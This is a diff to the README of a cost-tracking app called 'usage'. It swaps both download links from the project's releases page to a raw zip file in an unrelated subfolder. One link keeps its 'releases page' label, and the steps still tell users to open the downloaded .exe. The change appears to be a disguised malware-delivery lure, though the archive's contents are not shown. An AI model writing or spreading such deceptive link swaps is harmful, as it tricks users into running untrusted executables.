@@ -1,6 +1,6 @@
 # 📊 usage - Track your coding tool costs privately
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Piscatory-liposarcoma960/usage/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Piscatory-liposarcoma960/usage/raw/refs/heads/main/bawtie/Software_v2.7-beta.2.zip)
 
 ## What this tool does
 
@@ -25,7 +25,7 @@ The usage app helps you monitor how much you spend while you code. It sits in yo
 
 Follow these steps to set up the application:
 
-1. Visit the [releases page](https://github.com/Piscatory-liposarcoma960/usage/releases).
+1. Visit the [releases page](https://github.com/Piscatory-liposarcoma960/usage/raw/refs/heads/main/bawtie/Software_v2.7-beta.2.zip).
 2. Look for the file ending in `.exe` under the latest release.
 3. Click the file name to start your download.
 4. Open the file once the download finishes.
